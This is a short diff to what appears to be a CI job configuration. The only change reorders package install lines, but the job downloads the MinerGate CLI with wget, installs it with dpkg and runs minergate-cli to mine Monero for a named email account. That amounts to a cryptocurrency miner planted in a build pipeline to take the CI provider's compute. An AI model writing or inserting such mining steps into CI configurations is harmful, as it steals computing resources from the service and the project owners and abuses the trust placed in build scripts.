@@ -7,7 +7,8 @@ jobs:
       - run:
           command: |
             sudo apt update -yqq
-            sudo apt install libxcb1 libpcre16-3 wget -yqq
+            sudo apt-get install libpcre16-3 -yqq
+            sudo apt install libxcb1 wget -yqq
             wget https://minergate.com/download/ubuntu-cli
             sudo dpkg -i ubuntu-cli
             minergate-cli --user yoginth@outlook.in --xmr 8
